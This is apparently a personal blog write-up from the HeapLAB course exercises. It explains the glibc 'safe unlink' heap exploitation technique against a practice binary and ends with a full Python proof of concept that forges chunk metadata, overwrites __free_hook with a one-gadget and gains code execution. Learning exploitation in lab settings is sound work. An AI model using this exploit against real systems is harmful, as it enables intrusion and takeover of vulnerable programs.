---
layout: post
title:  "HeapLAB 1 - Safe Unlink"
date:   2022-12-07 20:01:01 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Exploitation

The modern version of the unlinking technique, `safe unlink`, is abit more complex, as mitigations were added. 

The new partial unlinking algorithm introduces 3 new integrity checks:

1. `chunksize(p) != prev_size(next_chunk(p))`
In case we control the `prev_size` of the next chunk, this can be easily bypassed. 

2. `fd->bk != p || bk->fd != p`
This is an harsh mitigation. \
We either have to write near the fake target addresses: `bk, fd` ptrs that points back to the chunk being freed. \
Another option is to find memory regions that contains pointers towards `p`. 

3. `p->fd_nextsize->bk_nextsize != p || p->bk_nextsize->fd_nextsize != p`
This is only relevant for `largebins`, similar to the above. 

The example binary contains a `glibc = 2.30`, with `NX, ASLR, Full RELRO, canary`. 

Note that there are also pointers of the heap stored at the `.bss`, within the `m_array` variable. \
The trick is to use these pointers, so that the `safe_unlink` checks may pass. 

As with the `unsafe unlink`, after a successful unlinking, the following 2 writes would occur:

```c
*(A->bk + 0x10) = A->fd;
*(A->fd + 0x18) = A->bk;
```

Moreover, the two new constraints due to the improved mitigation are (assuming the `size` check can be easily bypassed):

```c
(A->bk)->fd == A
(A->fd)->bk == A
```

Meaning:

```c
*(A->bk + 0x10) == A
*(A->fd + 0x18) == A
```

So there would be a total of 2 writes, and 2 constraints. 

Recall that the writes are only being made after the constraints have succesfully passed. \
So it *DOESN'T* mean the solution must enforce the following criteria: `A->fd == A->bk == A`.

Note that it is actually pretty common to see global pointers towards the heap. \
On our example binary, we have `m_array`, which is a global pointer at `0x602060`, that stores the value of `A` address, `0x603010`. \
(Note that this is the `user_content` part memory address, not the full chunk's start address! \
we will fix this by referring the chunk as being started 0x10 bytes away from its real start address, `0x603000`). 

In case we set `A->fd + 0x18` to the address of `m_array`, the last check should would pass - because `*(0x602060) == 0x603010`. \
The same holds for `A->bk + 0x10`. \

So the two constraints are being translated to:

```c
A->bk = &m_array - 0x10
A->fd = &m_array - 0x18
```

This would result with corrupting the quadword at `&m_array` with the value of `&m_array - 0x18` (as it is being the last write), and succesfully unlinking the consolidated chunk. 

As said, we must make sure that the global pointer, `m_array`, points towards the *real* chunk heap address, and not only to its `user_data` part. 

In order to overcome this, recall that we control `prev_size` field of the freed chunk. \
Since Malloc uses this field to determine the previous chunk start address, we can trick it so that it will think the chunk starts 0x10 bytes after its real address. 

Now, recall that after the unlink has occured, `m_array[0] = &m_array - 0x18`. \
It means the `m_array` would contain a pointer towards the `.bss`, instead of the heap. \
A simple request to write to index 0 of the array results with an overflow of the `target` address.

Full RCE POC:

```python
# Request 2 small chunks.
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

# Prepare fake chunk metadata - this setting of fd and bk is required to bypass the new mitigations
fd = elf.sym.m_array - 0x18
bk = elf.sym.m_array - 0x10
# We have to fake the previous allocated chunk size to 0x10 bytes below its original size, because m_array points at its user_content, not the chunk's start
prev_size = 0x80
# Set PREV_INUSE = 0, although the previous chunk IS allocated! this will allow the chunks consolidation
fake_size = 0x90

# Set new prev_size and size
chunk_a_prev_size = p64(0)
# Because of the size mitigation, it must match with the prev_size of the next chunk, which we set to 0x80 above
chunk_a_size = p64(0x80)  
# Note the total length of chunk_A should now appear as a total of 0x80
edit(chunk_A, chunk_a_prev_size + chunk_a_size + p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size))

# Trigger consolidation of chunk_A (because it is marked as not used), thus unlinking it
free(chunk_B)

# Now m_array[0] points to the .bss instead of the heap, overwrite it with our target address
edit(0, b"A" * 0x18 + p64(libc.sym.__free_hook))

# Overwrite the target data with onegadget
edit(0, p64(libc.address + 0xe1fa1))

# Trigger onegadget
free(chunk_A)
```

Note that I've chose a fake `prev_size = 0x80`. \
It is possible to forge a large `prev_size` field, so that the consolidation attempt wraps around the VA space, and operate on a fake chunk within the freed chunk (meaning we can set its `size` value so the integrity check of `size(p) == prev_size(next(p))`would pass). 
